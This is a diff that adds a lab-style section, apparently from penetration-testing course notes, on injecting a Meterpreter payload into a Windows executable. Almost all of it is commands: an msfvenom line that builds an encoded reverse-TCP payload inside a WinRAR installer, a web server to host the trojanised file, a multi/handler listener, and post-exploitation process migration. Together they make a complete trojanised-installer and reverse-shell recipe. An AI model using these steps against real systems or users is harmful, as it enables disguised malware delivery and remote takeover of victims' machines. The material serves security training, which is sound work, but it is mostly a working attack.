@@ -224,4 +224,59 @@
 
 4. **Execute the payload on the target system**:
    - On the Windows system, after uploading the payload, executing it on the target will allow us to obtain a Meterpreter session on our Kali system.
+  
+## Injecting Payloads Into Windows Portable Executables (Demo)
 
+`msfvenom`
+
+### We use the -x option (k and x would also work)
+
+`msfvenom`
+
+We are going to generate a x86 meterpreter payload and inject it into the WinRaR setup file. So we download WinRaR.
+
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe`
+
+We check out if the payload got generated successfully
+
+`cd Desktop/Windows_Payloads/`
+
+`ls`
+
+We can see the payload "winrar.exe"
+
+We set up a web server to host the files in a directory
+
+`sudo python -m SimpleHTTPServer 80`
+
+We set up a Listener (multi handler) on a New Tab
+
+`msfconsole`
+
+`use multi/handler`
+
+Set payload that we used to generate our executeable
+
+`set payload windwows/meterpreter/reverse_tcp`
+
+`set LHOST [own IP]`
+
+`set LPORT 1234`
+
+`run`
+
+On the Windows system, we can execute the payload (winrar setup file). Because we didn't utilized the -k option, it will not start the setup process, instead it just executes the payload.
+
+On the kali system, we got a meterpreter session.
+
+Manages the process that the meterpreter payload is currently running on onto another on (for example, notepad.exe):
+
+`run post/windows/migrate`
+
+![grafik](https://github.com/user-attachments/assets/dbd5d1aa-d2ca-4d62-b740-9baa19f01462)
+
+### -K Option
+
+- The -k options maintains the functionality of the file we are injecting with a payload. Works not on a lot of executables, though. Requires a lot of testing with different executables.
+
+``
